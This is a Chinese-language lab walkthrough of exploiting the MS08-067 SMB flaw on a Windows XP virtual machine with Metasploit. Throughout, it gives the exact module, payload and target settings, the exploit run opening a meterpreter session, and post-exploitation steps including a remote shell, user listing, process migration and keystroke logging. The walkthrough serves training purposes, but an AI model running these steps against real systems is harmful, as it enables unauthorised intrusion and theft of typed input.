### 1、漏洞覆盖系统范围
MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的 Windows 7 Pro-Beta
以下实验以WinXP为例
### 2、进入msf终端
```shell script
┌──(rootli)-[~]
└─# msfconsole
```
### 3、搜索漏洞框架
```shell script
msf6 > search ms08-067
 
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > 
```
### 4、设置payload
```shell script
msf6 >  use exploit/windows/smb/ms08_067_netapi 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
```
### 5、查看需要设置的选项
```shell script
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```
### 6、查看被攻击主机的ip，并设置攻击ip
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_1.png)
```shell script
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 172.16.120.141
RHOSTS => 172.16.120.141
```
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_2.png)
### 7、查看并设置攻击目标
也可以不设置，默认为0，自动匹配
```shell script
msf6 exploit(windows/smb/ms08_067_netapi) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows 2003 SP0 Universal
   4   Windows XP SP2 English (AlwaysOn NX)
   5   Windows XP SP2 English (NX)
   6   Windows XP SP3 English (AlwaysOn NX)
   7   Windows XP SP3 English (NX)
   8   Windows XP SP2 Arabic (NX)
   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
   10  Windows XP SP2 Chinese - Simplified (NX)
   11  Windows XP SP2 Chinese - Traditional (NX)
   12  Windows XP SP2 Czech (NX)
   13  Windows XP SP2 Danish (NX)
   14  Windows XP SP2 German (NX)
   15  Windows XP SP2 Greek (NX)
   16  Windows XP SP2 Spanish (NX)
   17  Windows XP SP2 Finnish (NX)
   18  Windows XP SP2 French (NX)
   19  Windows XP SP2 Hebrew (NX)
   20  Windows XP SP2 Hungarian (NX)
   21  Windows XP SP2 Italian (NX)
   22  Windows XP SP2 Japanese (NX)
   23  Windows XP SP2 Korean (NX)
   24  Windows XP SP2 Dutch (NX)
   25  Windows XP SP2 Norwegian (NX)
   26  Windows XP SP2 Polish (NX)
   27  Windows XP SP2 Portuguese - Brazilian (NX)
   28  Windows XP SP2 Portuguese (NX)
   29  Windows XP SP2 Russian (NX)
   30  Windows XP SP2 Swedish (NX)
   31  Windows XP SP2 Turkish (NX)
   32  Windows XP SP3 Arabic (NX)
   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
   34  Windows XP SP3 Chinese - Simplified (NX)
   35  Windows XP SP3 Chinese - Traditional (NX)
   36  Windows XP SP3 Czech (NX)
   37  Windows XP SP3 Danish (NX)
   38  Windows XP SP3 German (NX)
   39  Windows XP SP3 Greek (NX)
   40  Windows XP SP3 Spanish (NX)
   41  Windows XP SP3 Finnish (NX)
   42  Windows XP SP3 French (NX)
   43  Windows XP SP3 Hebrew (NX)
   44  Windows XP SP3 Hungarian (NX)
   45  Windows XP SP3 Italian (NX)
   46  Windows XP SP3 Japanese (NX)
   47  Windows XP SP3 Korean (NX)
   48  Windows XP SP3 Dutch (NX)
   49  Windows XP SP3 Norwegian (NX)
   50  Windows XP SP3 Polish (NX)
   51  Windows XP SP3 Portuguese - Brazilian (NX)
   52  Windows XP SP3 Portuguese (NX)
   53  Windows XP SP3 Russian (NX)
   54  Windows XP SP3 Swedish (NX)
   55  Windows XP SP3 Turkish (NX)
   56  Windows 2003 SP1 English (NO NX)
   57  Windows 2003 SP1 English (NX)
   58  Windows 2003 SP1 Japanese (NO NX)
   59  Windows 2003 SP1 Spanish (NO NX)
   60  Windows 2003 SP1 Spanish (NX)
   61  Windows 2003 SP1 French (NO NX)
   62  Windows 2003 SP1 French (NX)
   63  Windows 2003 SP2 English (NO NX)
   64  Windows 2003 SP2 English (NX)
   65  Windows 2003 SP2 German (NO NX)
   66  Windows 2003 SP2 German (NX)
   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
   68  Windows 2003 SP2 Spanish (NO NX)
   69  Windows 2003 SP2 Spanish (NX)
   70  Windows 2003 SP2 Japanese (NO NX)
   71  Windows 2003 SP2 French (NO NX)
   72  Windows 2003 SP2 French (NX)
```
```shell script
msf6 exploit(windows/smb/ms08_067_netapi) > set target 34
target => 34
```
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_3.png)
### 8、攻击
```shell script
msf6 exploit(windows/smb/ms08_067_netapi) > exploit 

[*] 172.16.120.141:445 - Attempting to trigger the vulnerability...
[*] Started bind TCP handler against 172.16.120.141:4444
[*] Sending stage (175174 bytes) to 172.16.120.141
[*] Meterpreter session 1 opened (172.16.120.177:42069 -> 172.16.120.141:4444 ) at 2022-01-16 17:07:39 +0800

meterpreter > 
```
在meterpreter下，可以输入Linux命令，操作Windows
```shell script
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2022-01-13 13:31:20 +0800  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2022-01-13 13:31:20 +0800  CONFIG.SYS
40777/rwxrwxrwx   0       dir   2022-01-13 13:25:45 +0800  Documents and Settings
100444/r--r--r--  0       fil   2022-01-13 13:31:20 +0800  IO.SYS
100444/r--r--r--  0       fil   2022-01-13 13:31:20 +0800  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-14 20:00:00 +0800  NTDETECT.COM
40555/r-xr-xr-x   0       dir   2022-01-13 13:26:21 +0800  Program Files
40777/rwxrwxrwx   0       dir   2022-01-13 13:25:45 +0800  System Volume Information
40777/rwxrwxrwx   0       dir   2022-01-13 21:24:19 +0800  WINDOWS
100666/rw-rw-rw-  211     fil   2022-01-13 21:25:34 +0800  boot.ini
100444/r--r--r--  322730  fil   2008-04-14 20:00:00 +0800  bootfont.bin
100444/r--r--r--  257728  fil   2008-04-14 20:00:00 +0800  ntldr
0000/---------    0       fif   1970-01-01 08:00:00 +0800  pagefile.sys

meterpreter > 
```
### 9、进入windows的cmd
```shell script
meterpreter > shell
Process 1800 created.
Channel 1 created.
Microsoft Windows XP [.1.2600]
(C) 1985-2001 Microsoft Corp.

C:\>
```
### 10、查看windows的用户
```shell script
C:\>net user
net user

\\ û

-------------------------------------------------------------------------------
Administrator            Guest                    HelpAssistant            
SUPPORT_388945a0   
```
### 11、键盘跟踪记录
#### 1. 在Windows中，开启"记事本"
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_5.png)
#### 2. 在kali中，切换到记事本到进程
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_4.png)
```shell script
meterpreter > migrate 1712
[*] Migrating from 1152 to 1712...
[*] Migration completed successfully.
```
#### 3. 开启键盘记录
```shell script
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```
#### 4. 在记事本中，输入内容，并在kali中查看
![image](https://github.com/498946975/Security/blob/master/images/ms08-067_6.png)
```shell script
meterpreter > keyscan_dump
Dumping captured keystrokes...
<^H>z<^H><^Z><^Z><^Z><^Z><^Z><^Z>liuxiang
```
